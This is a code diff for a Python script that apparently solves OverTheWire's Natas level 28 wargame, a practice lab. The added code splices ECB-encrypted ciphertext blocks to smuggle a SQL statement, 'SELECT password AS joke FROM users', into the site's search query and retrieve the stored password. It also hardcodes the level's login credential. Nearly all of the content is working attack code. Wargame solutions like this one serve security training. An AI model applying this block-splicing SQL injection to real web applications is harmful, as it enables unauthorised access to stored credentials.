@@ -3,15 +3,14 @@ from requests.auth import HTTPBasicAuth
 import logging
 import string
 import base64
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse, parse_qs, quote
 import shutil
-import random
-from termcolor import colored, cprint
+from termcolor import cprint
 import sys
 
 logging.basicConfig(level=logging.INFO)
 
-url = "http://natas28.natas.labs.overthewire.org/index.php"
+url = "http://natas28.natas.labs.overthewire.org/"
 level_username = "natas28"
 level_password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
 block_size = 16
@@ -44,10 +43,16 @@ def print_start(input):
 
 # Utilities for checking an encrypted query #####################################
 
+def construct_encrypted_query(bytes_arr):
+    query = bytes(bytes_arr)
+    return quote(base64.b64encode(query))
+
+
 def send_encrypted_query(bytes_arr):
     query = bytes(bytes_arr)
     encoded_query = base64.b64encode(query)
-    res = requests.get(url, auth=auth, params={'query': encoded_query})
+    print(url + '/search.php/')
+    res = requests.get(url + '/search.php', auth=auth, params={'query': encoded_query})
     # logging.debug(res.text)
     return res
 
@@ -110,8 +115,8 @@ def get_offset():
             return offset, repeating_blocks_start_index
         print(text_output)
 
-# MAIN ##########################################################################
-if __name__ == "__main__":
+
+def find_plaintext():
     offset, start_index = get_offset()
     size_to_find = block_size * 2
     match_index_start = start_index
@@ -148,3 +153,25 @@ if __name__ == "__main__":
         else:
             cprint("Byte not found. Exiting...", 'red')
             sys.exit(1)
+
+
+# MAIN ##########################################################################
+if __name__ == "__main__":
+    query = "SELECT password AS joke FROM users"
+    while len(query) % 16 != 0:
+        query += " "
+
+    print(len(query))
+    offset_padding = 'b' * 10
+    padding = chr(16) * 16
+    plaintext = offset_padding + query + padding
+    enc_query = get_encrypted_query_from_plaintext(plaintext)
+    print_blocks(enc_query)
+
+    start_index = 48
+    end_index = len(query) + len(padding)
+    enc_query_slice = enc_query[start_index:start_index + end_index]
+    res = send_encrypted_query(enc_query_slice)
+    print(res.text)
+    print()
+    print(construct_encrypted_query(enc_query_slice))
